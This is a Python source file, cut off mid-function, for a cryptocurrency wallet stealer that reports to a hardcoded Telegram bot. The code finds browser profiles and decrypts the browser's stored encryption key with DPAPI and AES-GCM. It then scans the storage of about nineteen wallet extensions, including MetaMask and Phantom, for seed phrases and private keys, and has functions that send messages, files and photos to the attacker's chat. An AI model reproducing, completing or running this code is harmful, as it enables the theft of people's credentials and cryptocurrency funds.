"""
Professional Crypto Data Extractor with Telegram Integration
Sends extracted data to Telegram bot with nice formatting
"""

import os, sys, json, sqlite3, base64, shutil, subprocess, time, random, requests, struct
from pathlib import Path
from datetime import datetime
from io import BytesIO

# BIP39 Wordlist for seed phrase validation
BIP39_WORDS = [
    "abandon", "ability", "able", "about", "above", "absent", "absorb", "abstract", "absurd", "abuse",
    "access", "accident", "account", "accuse", "achieve", "acid", "acoustic", "acquire", "across", "act",
    "action", "actor", "actual", "adapt", "add", "addict", "address", "adjust", "admit", "adult",
    "advance", "advice", "aerobic", "affair", "afford", "afraid", "again", "age", "agent", "agree",
    "ahead", "aim", "air", "airport", "aisle", "alarm", "album", "alcohol", "alert", "alien",
    "all", "alley", "allow", "almost", "alone", "alpha", "already", "also", "alter", "always",
    "amateur", "amazing", "among", "amount", "amused", "analyst", "anchor", "ancient", "anger", "angle",
    "angry", "animal", "ankle", "announce", "annual", "another", "answer", "antenna", "antique", "anxiety",
    "any", "apart", "apology", "appear", "apple", "approve", "april", "area", "arena", "argue",
    "arm", "armed", "armor", "army", "around", "arrange", "arrest", "arrive", "arrow", "art",
    "article", "artist", "artwork", "ask", "aspect", "assault", "asset", "assist", "assume", "asthma",
    "athlete", "atom", "attack", "attend", "attitude", "attract", "auction", "audit", "august", "aunt",
    "author", "auto", "autumn", "average", "avocado", "avoid", "awake", "aware", "away", "awesome",
    "awful", "awkward", "axis", "baby", "bachelor", "bacon", "badge", "bag", "balance", "balcony",
    "ball", "bamboo", "banana", "banner", "bar", "barely", "bargain", "barrel", "base", "basic",
    "basket", "battle", "beach", "bean", "beauty", "because", "become", "beef", "before", "begin",
    "behave", "behind", "believe", "below", "belt", "bench", "benefit", "best", "betray", "better",
    "between", "beyond", "bicycle", "bid", "bike", "bind", "biology", "bird", "birth", "bitter",
    "black", "blade", "blame", "blanket", "blast", "bleak", "bless", "blind", "blood", "blossom",
    "blow", "blue", "blur", "blush", "board", "boat", "body", "boil", "bomb", "bone",
    "bonus", "book", "boost", "border", "boring", "borrow", "boss", "bottom", "bounce", "box",
    "boy", "bracket", "brain", "brand", "brass", "brave", "bread", "breeze", "brick", "bridge",
    "brief", "bright", "bring", "brisk", "broccoli", "broken", "bronze", "broom", "brother", "brown",
    "brush", "bubble", "buddy", "budget", "buffalo", "build", "bulb", "bulk", "bullet", "bundle",
    "bunker", "burden", "burger", "burst", "bus", "business", "busy", "butter", "buyer", "buzz",
    "cabbage", "cabin", "cable", "cactus", "cage", "cake", "call", "calm", "camera", "camp",
    "can", "canal", "cancel", "candy", "cannon", "canoe", "canvas", "canyon", "capable", "capital",
    "captain", "car", "carbon", "card", "care", "career", "careful", "careless", "cargo", "carpet",
    "carry", "cart", "case", "cash", "casino", "cast", "casual", "cat", "catalog", "catch",
    "category", "cattle", "caught", "cause", "caution", "cave", "ceiling", "celery", "cement", "census",
    "century", "cereal", "certain", "chair", "chalk", "champion", "change", "chaos", "chapter", "charge",
    "chase", "chat", "cheap", "check", "cheese", "chef", "cherry", "chest", "chicken", "chief",
    "child", "chimney", "choice", "choose", "chronic", "chuckle", "chunk", "churn", "cigar", "cinnamon",
    "circle", "citizen", "city", "civil", "claim", "clamp", "clarify", "claw", "clay", "clean",
    "clerk", "clever", "click", "client", "cliff", "climb", "clinic", "clip", "clock", "clog",
    "close", "cloth", "cloud", "clown", "club", "clump", "cluster", "clutch", "coach", "coast",
    "coconut", "code", "coffee", "coil", "coin", "collect", "color", "column", "combine", "come",
    "comfort", "comic", "common", "company", "concert", "conduct", "confirm", "congress", "connect", "consider",
    "control", "convince", "cook", "cool", "copper", "copy", "coral", "core", "corn", "correct",
    "cost", "cotton", "couch", "country", "couple", "course", "cousin", "cover", "coyote", "crack",
    "cradle", "craft", "cram", "crane", "crash", "crater", "crawl", "crazy", "cream", "credit",
    "creek", "crew", "cricket", "crime", "crisp", "critic", "crop", "cross", "crouch", "crowd",
    "crucial", "cruel", "cruise", "crumble", "crunch", "crush", "cry", "crystal", "cube", "culture",
    "cup", "cupboard", "curious", "current", "curtain", "curve", "cushion", "custom", "cute", "cycle",
    "dad", "damage", "damp", "dance", "danger", "daring", "dark", "dash", "date", "daughter",
    "dawn", "day", "deal", "debate", "debris", "decade", "december", "decide", "decline", "decorate",
    "decrease", "deer", "defense", "define", "defy", "degree", "delay", "deliver", "demand", "demise",
    "denial", "dentist", "deny", "depart", "depend", "deposit", "depth", "deputy", "derive", "describe",
    "desert", "design", "desk", "despair", "destroy", "detail", "detect", "develop", "device", "devote",
    "diagram", "dial", "diamond", "diary", "dice", "diesel", "diet", "differ", "digital", "dignity",
    "dilemma", "dinner", "dinosaur", "direct", "dirt", "disagree", "discover", "disease", "dish", "dismiss",
    "disorder", "display", "distance", "divert", "divide", "divorce", "dizzy", "doctor", "document", "dog",
    "doll", "dolphin", "domain", "donate", "donkey", "donor", "door", "dose", "double", "dove",
    "draft", "dragon", "drama", "drastic", "draw", "dream", "dress", "drift", "drill", "drink",
    "drip", "drive", "drop", "drum", "dry", "duck", "dumb", "dune", "during", "dust",
    "dutch", "duty", "dwarf", "dynamic", "eager", "eagle", "early", "earn", "earth", "easily",
    "east", "easy", "echo", "ecology", "economy", "edge", "edit", "educate", "effort", "egg",
    "eight", "either", "elbow", "elder", "electric", "elegant", "element", "elephant", "elevator", "elite",
    "else", "embark", "embody", "embrace", "emerge", "emotion", "employ", "empower", "empty", "enable",
    "enact", "end", "endless", "endorse", "enemy", "energy", "enforce", "engage", "engine", "enhance",
    "enjoy", "enlist", "enough", "enrich", "enroll", "ensure", "enter", "entire", "entry", "envelope",
    "episode", "equal", "equip", "era", "erase", "erode", "erosion", "error", "erupt", "escape",
    "essay", "essence", "estate", "eternal", "ethics", "evidence", "evil", "evoke", "evolve", "exact",
    "example", "exceed", "excel", "exception", "excess", "exchange", "excite", "exclude", "excuse", "execute",
    "exercise", "exhaust", "exhibit", "exile", "exist", "exit", "exotic", "expand", "expect", "expire",
    "explain", "expose", "express", "extend", "extra", "eye", "eyebrow", "fabric", "face", "faculty",
    "fade", "faint", "faith", "fall", "false", "fame", "family", "famous", "fan", "fancy",
    "fantasy", "farm", "fashion", "fat", "fatal", "father", "fatigue", "fault", "favorite", "feature",
    "february", "federal", "fee", "feed", "feel", "female", "fence", "festival", "fetch", "fever",
    "few", "fiber", "fiction", "field", "figure", "file", "film", "filter", "final", "find",
    "fine", "finger", "finish", "fire", "firm", "first", "fiscal", "fish", "fit", "fitness",
    "fix", "flag", "flame", "flash", "flat", "flavor", "flee", "flight", "flip", "float",
    "flock", "floor", "flower", "fluid", "flush", "fly", "foam", "focus", "fog", "foil",
    "fold", "follow", "food", "foot", "force", "forest", "forget", "fork", "fortune", "forum",
    "forward", "fossil", "foster", "found", "fox", "fragile", "frame", "frequent", "fresh", "friend",
    "fringe", "frog", "front", "frost", "frown", "frozen", "fruit", "fuel", "fun", "funny",
    "furnace", "fury", "future", "gadget", "gain", "galaxy", "gallery", "game", "gap", "garage",
    "garbage", "garden", "garlic", "garment", "gas", "gasp", "gate", "gather", "gauge", "gaze",
    "general", "genius", "genre", "gentle", "genuine", "gesture", "ghost", "giant", "gift", "giggle",
    "ginger", "giraffe", "girl", "give", "glad", "glance", "glare", "glass", "glide", "glimpse",
    "globe", "gloom", "glory", "glove", "glow", "glue", "goat", "goddess", "gold", "good",
    "goose", "gorilla", "gospel", "gossip", "govern", "gown", "grab", "grace", "grain", "grant",
    "grape", "grass", "gravity", "great", "green", "grid", "grief", "grit", "grocery", "group",
    "grow", "grunt", "guard", "guess", "guide", "guilt", "guitar", "gun", "gym", "habit",
    "hair", "half", "hammer", "hamster", "hand", "happy", "harbor", "hard", "harsh", "harvest",
    "hat", "have", "hawk", "hazard", "head", "health", "heart", "heavy", "hedgehog", "height",
    "hello", "helmet", "help", "hen", "hero", "hidden", "high", "hill", "hint", "hip",
    "hire", "history", "hobby", "hockey", "hold", "hole", "holiday", "hollow", "home", "honey",
    "hood", "hope", "horn", "horror", "horse", "hospital", "host", "hotel", "hour", "hover",
    "hub", "huge", "human", "humble", "humor", "hundred", "hungry", "hunt", "hurdle", "hurry",
    "hurt", "husband", "hybrid", "ice", "icon", "idea", "identify", "idle", "ignore", "ill",
    "illegal", "illness", "image", "imitate", "immense", "immune", "impact", "impose", "improve", "impulse",
    "inch", "include", "income", "increase", "index", "indicate", "indoor", "industry", "infant", "inflict",
    "inform", "inhale", "inherit", "initial", "inject", "injury", "inmate", "inner", "innocent", "input",
    "inquiry", "insane", "insect", "inside", "inspire", "install", "intact", "interest", "into", "invest",
    "invite", "involve", "iron", "island", "isolate", "issue", "item", "ivory", "jacket", "jaguar",
    "jar", "jazz", "jealous", "jeans", "jelly", "jewel", "job", "join", "joke", "journey",
    "joy", "judge", "juice", "jump", "jungle", "junior", "junk", "just", "kangaroo", "keen",
    "keep", "ketchup", "key", "kick", "kid", "kidney", "kind", "kingdom", "kiss", "kit",
    "kitchen", "kite", "kitten", "kiwi", "knee", "knife", "knock", "know", "lab", "label",
    "labor", "ladder", "lady", "lake", "lamp", "language", "laptop", "large", "later", "latin",
    "laugh", "laundry", "lava", "law", "lawn", "lawsuit", "layer", "lazy", "leader", "leaf",
    "learn", "leave", "lecture", "left", "leg", "legal", "legend", "leisure", "lemon", "lend",
    "length", "lens", "leopard", "lesson", "letter", "level", "liar", "liberty", "library", "license",
    "life", "lift", "light", "like", "limb", "limit", "link", "lion", "liquid", "list",
    "little", "live", "lizard", "load", "loan", "lobster", "local", "lock", "logic", "lonely",
    "long", "loop", "lottery", "loud", "lounge", "love", "loyal", "lucky", "luggage", "lumber",
    "lunar", "lunch", "luxury", "lyrics", "machine", "mad", "magic", "magnet", "maid", "mail",
    "main", "major", "make", "mammal", "man", "manage", "mandate", "mango", "mansion", "manual",
    "maple", "marble", "march", "margin", "marine", "market", "marriage", "mask", "mass", "master",
    "match", "material", "math", "matrix", "matter", "maximum", "maze", "meadow", "mean", "measure",
    "meat", "mechanic", "medal", "media", "melody", "melt", "member", "memory", "mention", "menu",
    "mercy", "merge", "merit", "merry", "mesh", "message", "metal", "method", "middle", "midnight",
    "milk", "million", "mimic", "mind", "minimum", "minor", "minute", "miracle", "mirror", "misery",
    "miss", "mistake", "mix", "mixed", "mixture", "mobile", "model", "modify", "mom", "moment",
    "monitor", "monkey", "monster", "month", "moon", "moral", "more", "morning", "mosquito", "mother",
    "motion", "motor", "mountain", "mouse", "move", "movie", "much", "muffin", "mule", "multiply",
    "muscle", "museum", "mushroom", "music", "must", "mutual", "myself", "mystery", "myth", "naive",
    "name", "napkin", "narrow", "nasty", "nation", "nature", "near", "neck", "need", "negative",
    "neglect", "neither", "nephew", "nerve", "nest", "net", "network", "neutral", "never", "news",
    "next", "nice", "night", "noble", "noise", "nominee", "none", "noodle", "normal", "north",
    "nose", "notable", "note", "nothing", "notice", "novel", "now", "nuclear", "number", "nurse",
    "nut", "oak", "obey", "object", "oblige", "obscure", "observe", "obtain", "obvious", "occur",
    "ocean", "october", "odor", "off", "offer", "office", "often", "oil", "okay", "old",
    "olive", "olympic", "omit", "once", "one", "onion", "online", "only", "open", "opera",
    "opinion", "oppose", "option", "orange", "orbit", "orchard", "order", "ordinary", "organ", "orient",
    "original", "orphan", "ostrich", "other", "outdoor", "outer", "output", "outside", "oval", "oven",
    "over", "own", "owner", "oxygen", "oyster", "ozone", "pact", "paddle", "page", "pair",
    "palace", "palm", "panda", "panel", "panic", "panther", "paper", "parade", "parent", "park",
    "parrot", "party", "pass", "patch", "path", "patient", "patrol", "pattern", "pause", "pave",
    "payment", "peace", "peanut", "pear", "peasant", "pelican", "pen", "penalty", "pencil", "people",
    "pepper", "perfect", "permit", "person", "pet", "phone", "photo", "phrase", "physical", "piano",
    "picnic", "picture", "piece", "pig", "pigeon", "pill", "pilot", "pink", "pioneer", "pipe",
    "pistol", "pitch", "pizza", "place", "planet", "plastic", "plate", "play", "please", "pledge",
    "pluck", "plug", "plunge", "poem", "poet", "point", "polar", "pole", "police", "pond",
    "pony", "pool", "popular", "portion", "position", "possible", "post", "potato", "pottery", "poverty",
    "powder", "power", "practice", "praise", "predict", "prefer", "prepare", "present", "pretty", "prevent",
    "price", "pride", "primary", "print", "priority", "prison", "private", "prize", "problem", "process",
    "produce", "profit", "program", "project", "promote", "proof", "property", "prosper", "protect", "proud",
    "provide", "public", "pudding", "pull", "pulp", "pulse", "pumpkin", "punch", "pupil", "puppy",
    "purchase", "purity", "purpose", "purse", "push", "put", "puzzle", "pyramid", "quality", "quantum",
    "quarter", "question", "quick", "quit", "quiz", "quote", "rabbit", "raccoon", "race", "rack",
    "radar", "radio", "rail", "rain", "raise", "rally", "ramp", "ranch", "random", "range",
    "rapid", "rare", "rate", "rather", "raven", "raw", "razor", "ready", "real", "reason",
    "rebel", "rebuild", "recall", "receive", "recipe", "record", "recycle", "reduce", "reflect", "reform",
    "refuse", "region", "regret", "regular", "reject", "relax", "release", "relief", "rely", "remain",
    "remember", "remind", "remove", "render", "renew", "rent", "reopen", "repair", "repeat", "replace",
    "report", "require", "rescue", "resemble", "resist", "resource", "response", "result", "retire", "retreat",
    "return", "reunion", "reveal", "review", "reward", "rhythm", "rib", "ribbon", "rice", "rich",
    "ride", "ridge", "rifle", "right", "rigid", "ring", "riot", "rip", "ripe", "rise",
    "risk", "rival", "river", "road", "roast", "robot", "robust", "rocket", "romance", "roof",
    "rookie", "room", "rose", "rotate", "rough", "round", "route", "royal", "rubber", "rude",
    "rug", "rule", "run", "runway", "rural", "rush", "rust", "sad", "saddle", "sadness",
    "safe", "sail", "salad", "salmon", "salon", "salt", "same", "sample", "sand", "satisfy",
    "satoshi", "sauce", "sausage", "save", "say", "scale", "scan", "scare", "scatter", "scene",
    "scheme", "school", "science", "scissors", "scorpion", "scout", "scrap", "screen", "script", "scrub",
    "sea", "search", "season", "seat", "second", "secret", "section", "security", "seed", "seek",
    "segment", "select", "sell", "seminar", "senior", "sense", "sentence", "series", "service", "session",
    "settle", "setup", "seven", "shadow", "shaft", "shallow", "share", "shed", "shell", "sheriff",
    "shield", "shift", "shine", "ship", "shiver", "shock", "shoe", "shoot", "shop", "short",
    "shoulder", "shove", "shrimp", "shrug", "shuffle", "shy", "sibling", "sick", "side", "siege",
    "sight", "sign", "silent", "silk", "silly", "silver", "similar", "simple", "since", "sing",
    "siren", "sister", "situate", "six", "size", "skate", "sketch", "ski", "skill", "skin",
    "skirt", "skull", "slab", "slam", "sleep", "slender", "slice", "slide", "slight", "slim",
    "slogan", "slot", "slow", "slush", "small", "smart", "smile", "smoke", "smooth", "snack",
    "snake", "snap", "sniff", "snow", "soap", "soccer", "social", "sock", "soda", "soft",
    "solar", "soldier", "solid", "solution", "solve", "someone", "song", "soon", "sorry", "sort",
    "soul", "sound", "soup", "source", "south", "space", "spare", "spatial", "spawn", "speak",
    "special", "speed", "spell", "spend", "sphere", "spice", "spider", "spike", "spin", "spirit",
    "split", "spoil", "sponsor", "spoon", "sport", "spot", "spray", "spread", "spring", "spy",
    "square", "squeeze", "squirrel", "stable", "stadium", "staff", "stage", "stairs", "stamp", "stand",
    "start", "state", "stay", "steak", "steel", "stem", "step", "stereo", "stick", "still",
    "sting", "stock", "stomach", "stone", "stool", "story", "stove", "strategy", "street", "strike",
    "strong", "struggle", "student", "stuff", "stumble", "style", "subject", "submit", "subway", "success",
    "such", "sudden", "suffer", "sugar", "suggest", "suit", "summer", "sun", "sunny", "sunset",
    "super", "supply", "support", "sure", "surface", "surge", "surprise", "surround", "survey", "suspect",
    "sustain", "swallow", "swamp", "swap", "swarm", "swear", "sweet", "swift", "swim", "swing",
    "switch", "sword", "symbol", "symptom", "syrup", "system", "table", "tackle", "tag", "tail",
    "talent", "talk", "tank", "tape", "target", "task", "taste", "tattoo", "taxi", "teach",
    "team", "tell", "ten", "tenant", "tennis", "tent", "term", "test", "text", "thank",
    "that", "theme", "then", "theory", "there", "they", "thing", "this", "thought", "three",
    "thrive", "throw", "thumb", "thunder", "ticket", "tide", "tiger", "tilt", "timber", "time",
    "tiny", "tip", "tired", "tissue", "title", "toast", "tobacco", "today", "toddler", "toe",
    "together", "toilet", "token", "tomato", "tomorrow", "tone", "tongue", "tonight", "tool", "tooth",
    "top", "topic", "topple", "torch", "tornado", "tortoise", "toss", "total", "tourist", "toward",
    "tower", "town", "toy", "track", "trade", "traffic", "tragic", "train", "transfer", "trap",
    "trash", "travel", "tray", "treat", "tree", "trend", "trial", "tribe", "trick", "trigger",
    "trim", "trip", "trophy", "trouble", "truck", "true", "truly", "trumpet", "trust", "truth",
    "try", "tube", "tuition", "tumble", "tuna", "tunnel", "turkey", "turn", "turtle", "twelve",
    "twenty", "twice", "twin", "twist", "two", "type", "typical", "ugly", "umbrella", "unable",
    "unaware", "uncle", "uncover", "under", "undo", "unfair", "unfold", "unhappy", "uniform", "unique",
    "unit", "universe", "unknown", "unlock", "until", "unusual", "unveil", "update", "upgrade", "uphold",
    "upon", "upper", "upset", "urban", "urge", "usage", "use", "used", "useful", "useless",
    "usual", "utility", "vacant", "vacuum", "vague", "valid", "valley", "valve", "van", "vanish",
    "vapor", "various", "vast", "vault", "vehicle", "velvet", "vendor", "venture", "venue", "verb",
    "verify", "version", "very", "vessel", "veteran", "viable", "vibrant", "vicious", "victory", "video",
    "view", "village", "vintage", "violin", "virtual", "virus", "visa", "visit", "visual", "vital",
    "vivid", "vocal", "voice", "void", "volcano", "volume", "vote", "voyage", "wage", "wagon",
    "wait", "walk", "wall", "walnut", "want", "warfare", "warm", "warrior", "wash", "wasp",
    "waste", "water", "wave", "way", "wealth", "weapon", "weary", "weather", "weave", "web",
    "wedding", "weekend", "weird", "welcome", "west", "wet", "whale", "what", "wheat", "wheel",
    "when", "where", "whip", "whisper", "wide", "width", "wife", "wild", "will", "win",
    "window", "wine", "wing", "wink", "winner", "winter", "wire", "wisdom", "wise", "wish",
    "witness", "wolf", "woman", "wonder", "wood", "wool", "word", "work", "world", "worry",
    "worth", "wrap", "wreck", "wrestle", "wrist", "write", "wrong", "yard", "year", "yellow",
    "you", "young", "youth", "zebra", "zero", "zone", "zoo"
]
BIP39_WORDLIST_SET = set(BIP39_WORDS)

# Telegram Bot Configuration
TELEGRAM_BOT_TOKEN = "8575170512:AAEZTSin4RTJbXpVX74mkAXaxQFSJ33E9NI"
TELEGRAM_CHAT_ID = "8201214928"  # Your Telegram ID
TELEGRAM_API_URL = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}"

class TelegramSender:
    def __init__(self):
        self.token = TELEGRAM_BOT_TOKEN
        self.chat_id = TELEGRAM_CHAT_ID
        self.api_url = TELEGRAM_API_URL
    
    def send_message(self, text, parse_mode="HTML"):
        """Send text message to Telegram"""
        try:
            url = f"{self.api_url}/sendMessage"
            data = {
                "chat_id": self.chat_id,
                "text": text,
                "parse_mode": parse_mode,
                "disable_web_page_preview": True
            }
            response = requests.post(url, json=data, timeout=10)
            return response.status_code == 200
        except Exception as e:
            return False
    
    def send_document(self, file_path, caption=""):
        """Send file to Telegram"""
        try:
            url = f"{self.api_url}/sendDocument"
            with open(file_path, 'rb') as f:
                files = {'document': f}
                data = {
                    'chat_id': self.chat_id,
                    'caption': caption
                }
                response = requests.post(url, files=files, data=data, timeout=30)
                return response.status_code == 200
        except Exception as e:
            return False
    
    def send_photo(self, file_path, caption=""):
        """Send photo to Telegram"""
        try:
            url = f"{self.api_url}/sendPhoto"
            with open(file_path, 'rb') as f:
                files = {'photo': f}
                data = {
                    'chat_id': self.chat_id,
                    'caption': caption
                }
                response = requests.post(url, files=files, data=data, timeout=30)
                return response.status_code == 200
        except Exception as e:
            return False

class CryptoExtractor:
    def __init__(self):
        self.output_dir = os.path.join(os.environ.get('TEMP', ''), f'tmp{random.randint(10000,99999)}')
        os.makedirs(self.output_dir, exist_ok=True)
        self.telegram = TelegramSender()
        self.data = {
            "timestamp": datetime.now().isoformat(),
            "crypto": {"wallets": [], "seeds": [], "keys": [], "extensions": []},
            "browsers": {},
            "system": {}
        }
        self._log("Initialized")
    
    def _log(self, msg):
        try:
            with open(os.path.join(self.output_dir, 'log.dat'), 'a', encoding='utf-8') as f:
                f.write(f"{datetime.now().isoformat()}|{msg}\n")
        except: pass
    
    def get_browser_paths(self):
        """Get all browser data paths"""
        paths = {}
        base = os.environ.get('LOCALAPPDATA', '')
        appdata = os.environ.get('APPDATA', '')
        
        browsers = {
            'chrome': [os.path.join(base, r'Google\Chrome\User Data'), os.path.join(appdata, r'Google\Chrome\User Data')],
            'edge': [os.path.join(base, r'Microsoft\Edge\User Data')],
            'brave': [os.path.join(base, r'BraveSoftware\Brave-Browser\User Data')],
            'opera': [os.path.join(base, r'Opera Software\Opera Stable')],
            'vivaldi': [os.path.join(base, r'Vivaldi\User Data')],
        }
        
        for name, path_list in browsers.items():
            for p in path_list:
                if os.path.exists(p):
                    paths[name] = p
                    break
        return paths
    
    def get_chrome_key(self, local_state_path):
        """Get Chrome encryption key"""
        try:
            with open(local_state_path, 'r', encoding='utf-8') as f:
                ls = json.load(f)
            ek = ls.get('os_crypt', {}).get('encrypted_key', '')
            if ek:
                ek = base64.b64decode(ek)[5:]
                try:
                    import win32crypt
                    return win32crypt.CryptUnprotectData(ek, None, None, None, 0)[1]
                except: pass
        except: pass
        return None
    
    def decrypt_value(self, enc_val, key=None):
        """Decrypt browser stored values"""
        try:
            import win32crypt
            return win32crypt.CryptUnprotectData(enc_val, None, None, None, 0)[1].decode('utf-8')
        except:
            if key:
                try:
                    from Crypto.Cipher import AES
                    iv = enc_val[3:15]
                    payload = enc_val[15:]
                    cipher = AES.new(key, AES.MODE_GCM, iv)
                    return cipher.decrypt(payload)[:-16].decode('utf-8')
                except: pass
        return None
    
    def read_leveldb(self, db_path):
        """Read LevelDB database using plyvel if available, otherwise fallback"""
        entries = []
        
        # Try using plyvel library (best method)
        try:
            import plyvel
            db = plyvel.DB(db_path, create_if_missing=False)
            for key, value in db:
                try:
                    key_str = key.decode('utf-8', errors='ignore')
                    try:
                        value_str = value.decode('utf-8', errors='ignore')
                        try:
                            json_data = json.loads(value_str)
                            entries.append(json_data)
                        except:
                            entries.append({key_str: value_str})
                    except:
                        entries.append({str(key): str(value)})
                except:
                    pass
            db.close()
            return entries
        except ImportError:
            # plyvel not available, use fallback
            pass
        except Exception as e:
            self._log(f"plyvel error: {e}, using fallback")
        
        # Fallback: Read LevelDB files manually
        if not os.path.exists(db_path):
            return entries
        
        try:
            for root, dirs, files in os.walk(db_path):
                for file in files:
                    if file.endswith(('.ldb', '.log')):
                        file_path = os.path.join(root, file)
                        try:
                            with open(file_path, 'rb') as f:
                                content = f.read()
                            
                            text = content.decode('utf-8', errors='ignore')
                            import re
                            json_matches = re.findall(r'\{[^{}]*(?:\{[^{}]*\}[^{}]*)*\}', text)
                            for match in json_matches[:20]:
                                try:
                                    json_data = json.loads(match)
                                    entries.append(json_data)
                                except: pass
                        except: continue
        except Exception as e:
            self._log(f"Fallback LevelDB read error: {e}")
        
        return entries
    
    def read_leveldb_file(self, file_path):
        """Read LevelDB file and extract key-value pairs"""
        entries = []
        try:
            with open(file_path, 'rb') as f:
                content = f.read()
            
            # Method 1: Try to extract JSON structures from binary data
            i = 0
            while i < len(content) - 10:
                if content[i:i+1] == b'{' or content[i:i+1] == b'[':
                    start = i
                    depth = 0
                    in_string = False
                    escape = False
                    
                    for j in range(i, min(i + 50000, len(content))):
                        if escape:
                            escape = False
                            continue
                        if content[j:j+1] == b'\\':
                            escape = True
                            continue
                        if content[j:j+1] == b'"':
                            in_string = not in_string
                            continue
                        if not in_string:
                            if content[j:j+1] == b'{' or content[j:j+1] == b'[':
                                depth += 1
                            elif content[j:j+1] == b'}' or content[j:j+1] == b']':
                                depth -= 1
                                if depth == 0:
                                    try:
                                        json_str = content[start:j+1].decode('utf-8', errors='ignore')
                                        json_data = json.loads(json_str)
                                        entries.append(json_data)
                                    except:
                                        pass
                                    i = j + 1
                                    break
                    else:
                        i += 1
                else:
                    i += 1
            
            # Method 2: Try to decode entire file as UTF-8 and extract JSON
            try:
                text = content.decode('utf-8', errors='ignore')
                import re
                # Find all JSON objects
                json_pattern = r'\{[^{}]*(?:\{[^{}]*\}[^{}]*)*\}'
                matches = re.finditer(json_pattern, text)
                for match in matches:
                    try:
                        json_data = json.loads(match.group())
                        entries.append(json_data)
                    except:
                        pass
            except:
                pass
            
            # Method 3: Look for common extension storage patterns
            # Many extensions store data with keys like "chrome-extension://..."
            text = content.decode('utf-8', errors='ignore')
            if 'chrome-extension://' in text or 'localStorage' in text or 'IndexedDB' in text:
                # Try to extract key-value pairs
                import re
                # Look for patterns like "key":"value"
                kv_pattern = r'["\']([^"\']+)["\']\s*:\s*["\']([^"\']+)["\']'
                for match in re.finditer(kv_pattern, text):
                    key, value = match.groups()
                    if any(kw in key.lower() for kw in ['seed', 'mnemonic', 'private', 'key', 'phrase', 'recovery']):
                        entries.append({key: value})
        except Exception as e:
            self._log(f"Error reading LevelDB {file_path}: {e}")
        
        return entries
    
    def extract_seeds_from_json(self, data, wallet_name):
        """Recursively extract seed phrases and private keys from JSON data"""
        seeds = []
        
        if isinstance(data, dict):
            for key, value in data.items():
                key_lower = str(key).lower()
                
                # Check for seed phrase patterns
                if any(kw in key_lower for kw in ['seed', 'mnemonic', 'phrase', 'recovery', 'backup']):
                    if isinstance(value, str):
                        # Check if it's a valid seed phrase
                        words = value.strip().split()
                        if 12 <= len(words) <= 24:
                            # Validate against BIP39 wordlist
                            valid_words = sum(1 for w in words if w.lower() in BIP39_WORDLIST_SET)
                            if valid_words >= len(words) * 0.8:  # 80% of words should be valid
                                seeds.append({
                                    "type": "seed_phrase",
                                    "source": f"{wallet_name}_extension",
                                    "value": value.strip(),
                                    "word_count": len(words)
                                })
                
                # Check for private keys
                if any(kw in key_lower for kw in ['private', 'key', 'secret', 'keystore']):
                    if isinstance(value, str):
                        val_clean = value.strip()
                        if len(val_clean) == 64 or (val_clean.startswith('0x') and len(val_clean) == 66):
                            seeds.append({
                                "type": "private_key",
                                "source": f"{wallet_name}_extension",
                                "value": val_clean
                            })
                
                # Recursively search nested structures
                seeds.extend(self.extract_seeds_from_json(value, wallet_name))
        
        elif isinstance(data, list):
            for item in data:
                seeds.extend(self.extract_seeds_from_json(item, wallet_name))
        
        elif isinstance(data, str):
            # Check if the string itself might be a seed phrase
            words = data.strip().split()
            if 12 <= len(words) <= 24:
                valid_words = sum(1 for w in words if w.lower() in BIP39_WORDLIST_SET)
                if valid_words >= len(words) * 0.8:
                    seeds.append({
                        "type": "seed_phrase",
                        "source": f"{wallet_name}_extension",
                        "value": data.strip(),
                        "word_count": len(words)
                    })
        
        return seeds
    
    def extract_all_crypto_extensions(self, browser_path, browser_name):
        """Extract all crypto wallet extensions with LevelDB vault decryption"""
        all_wallets = []
        all_seeds = []
        
        # COMPLETE LIST OF ALL CRYPTO WALLETS
        crypto_extensions = {
            'metamask': 'nkbihfbeogaeaoehlefnkodbefgpgknn',
            'phantom': 'bfnaelmomeimhlpmgjnjophhpkkoljpa',
            'trust': 'egjidjbpglichdcondbcbdnbeeppgdph',
            'coinbase': 'hnfanknocfeofbddgcijnmhnfnkdnaad',
            'exodus': 'aholpfdialjgjfhomihkjbmgjidlcdno',
            'atomic': 'dccgkkfkmbafjapdciinphppapdchfhh',
            'mathwallet': 'afbcbjpbpfadlkmhmclhkeeodmamcflc',
            'tronlink': 'ibnejdfjmmkpcnlpebklmnkoeoihofec',
            'binance': 'fhbohimaelbohpjbbldcngcnapndodjp',
            'okx': 'mcohilncbfahbmgdjkbpemcciiolgcge',
            'keplr': 'dmkamcknogkgcdfhhbddcghachkejeap',
            'solflare': 'bhghoamapcdpbohphigoooaddinpkbai',
            'rabby': 'acmacodkjbdgmoleebolmdjonilkdbch',
            'frame': 'hbljlbphjnlghnjjajibkfnmlfcglflj',
            'temple': 'ookjlbkiijinhpmnjffcofjonbfbgaoc',
            'yoroi': 'ffnbelfdoehohenjggjdkclllmacjbdi',
            'nami': 'glnpiemhiohmelhjhijhbidkolnmdlkd',
            'gero': 'ghgabhidcehdhjifalgafbgkhloaklkd',
            'flint': 'nfhnjljdfibcnahpjljadgcmaljpljnm',
        }
        
        # Get Chrome encryption key
        local_state = os.path.join(browser_path, 'Local State')
        chrome_key = self.get_chrome_key(local_state)
        
        ext_base = os.path.join(browser_path, 'Default', 'Extensions')
        if not os.path.exists(ext_base):
            return all_wallets
        
        for wallet_name, ext_id in crypto_extensions.items():
            # Multiple storage locations to check
            storage_paths = [
                os.path.join(browser_path, 'Default', 'Local Extension Settings', ext_id),
                os.path.join(browser_path, 'Default', 'Sync Extension Settings', ext_id),
                os.path.join(browser_path, 'Default', 'IndexedDB', f'chrome-extension_{ext_id}_0.indexeddb.leveldb'),
                os.path.join(browser_path, 'Default', 'IndexedDB', f'chrome-extension_{ext_id}_0.indexeddb.blob'),
            ]
            
            # Also check for IndexedDB in subdirectories
            indexeddb_base = os.path.join(browser_path, 'Default', 'IndexedDB')
            if os.path.exists(indexeddb_base):
                for item in os.listdir(indexeddb_base):
                    if ext_id in item or wallet_name.lower() in item.lower():
                        item_path = os.path.join(indexeddb_base, item)
                        if os.path.isdir(item_path):
                            storage_paths.append(item_path)
            
            found_storage = False
            for storage_path in storage_paths:
                if os.path.exists(storage_path):
                    found_storage = True
                    break
            
            if not found_storage:
                continue
            
            self._log(f"Extracting {wallet_name} from {browser_name} (ID: {ext_id})")
            
            # Read all LevelDB files from all storage paths
            for storage_path in storage_paths:
                if not os.path.exists(storage_path):
                    continue
                
                # If it's a file, read it directly
                if os.path.isfile(storage_path):
                    try:
                        entries = self.read_leveldb_file(storage_path)
                        for entry in entries:
